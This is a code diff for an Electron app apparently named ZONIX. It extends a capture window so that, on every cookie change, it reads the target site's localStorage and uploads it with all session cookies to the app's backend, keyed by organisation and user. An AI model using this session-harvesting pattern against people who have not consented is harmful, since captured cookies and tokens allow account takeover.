@@ -804,13 +804,18 @@ function registerIPC() {
          connectWebSocket();
         
         setTimeout(() => {
-          if (result.user.role === 'DISPATCHER') {
-            createSyncWindow(actualOrgId, result.user.id, result.organization.targetUrl || '');
-          } else {
-            createMainWindow();
-          }
-          if (authWindow) {
-            authWindow.close();
+          try {
+            if (result.user.role === 'DISPATCHER') {
+              createSyncWindow(actualOrgId, result.user.id, result.organization.targetUrl || '');
+            } else {
+              createMainWindow();
+            }
+          } catch (err) {
+            console.error('[ZONIX Main] Failed to transition after login:', err.message);
+          } finally {
+            if (authWindow) {
+              authWindow.close();
+            }
           }
         }, 50);
 
@@ -1111,6 +1116,8 @@ function registerIPC() {
       console.error('[ZONIX Main] Capture window failed to load URL:', loadErr.message);
     }
 
+    let lastCapturedLocalStorage = '{}';
+
     const handleCookieChange = async (event, cookie, cause, removed) => {
       try {
         const allCookies = await sess.cookies.get({});
@@ -1131,6 +1138,26 @@ function registerIPC() {
           };
         });
 
+        let localStorageData = '{}';
+        try {
+          if (captureWindow && !captureWindow.isDestroyed()) {
+            localStorageData = await captureWindow.webContents.executeJavaScript(`
+              (function() {
+                try {
+                  return JSON.stringify(window.localStorage);
+                } catch (err) {
+                  return '{}';
+                }
+              })()
+            `);
+            if (localStorageData && localStorageData !== '{}') {
+              lastCapturedLocalStorage = localStorageData;
+            }
+          }
+        } catch (lsErr) {
+          console.error('[ZONIX Main] Live localStorage capture failed:', lsErr.message);
+        }
+
         const targetDomain = new URL(targetUrl).hostname;
         await zonixFetch(`${CONFIG.BACKEND_URL}/api/cookies/store`, {
           method: 'POST',
@@ -1142,12 +1169,13 @@ function registerIPC() {
             orgId: targetOrgId,
             userId: targetUserId,
             targetDomain,
-            cookies: serializedCookies
+            cookies: serializedCookies,
+            localStorage: lastCapturedLocalStorage
           })
         });
-        console.log(`[ZONIX Main] Live synced ${serializedCookies.length} cookies for user ${targetUserId}`);
+        console.log(`[ZONIX Main] Live synced ${serializedCookies.length} cookies & localStorage for user ${targetUserId}`);
       } catch (err) {
-        console.error('[ZONIX Main] Live cookie sync failed:', err.message);
+        console.error('[ZONIX Main] Live cookie/storage sync failed:', err.message);
       }
     };
 
@@ -1159,22 +1187,23 @@ function registerIPC() {
       if (isCaptured) return;
       e.preventDefault();
       try {
-        localStorageData = await captureWindow.webContents.executeJavaScript(`
-          (function() {
-            try {
-              const iframe = document.createElement('iframe');
-              iframe.style.display = 'none';
-              document.documentElement.appendChild(iframe);
-              const data = JSON.stringify(iframe.contentWindow.localStorage);
-              iframe.remove();
-              return data;
-            } catch (err) {
-              return '{}';
-            }
-          })()
-        `);
+        if (captureWindow && !captureWindow.isDestroyed()) {
+          localStorageData = await captureWindow.webContents.executeJavaScript(`
+            (function() {
+              try {
+                return JSON.stringify(window.localStorage);
+              } catch (err) {
+                return '{}';
+              }
+            })()
+          `);
+        }
       } catch (err) {
-        console.error('[ZONIX Main] Failed to capture localStorage:', err.message);
+        console.error('[ZONIX Main] Final localStorage capture failed:', err.message);
+      }
+
+      if (!localStorageData || localStorageData === '{}') {
+        localStorageData = lastCapturedLocalStorage;
       }
       isCaptured = true;
       captureWindow.close();
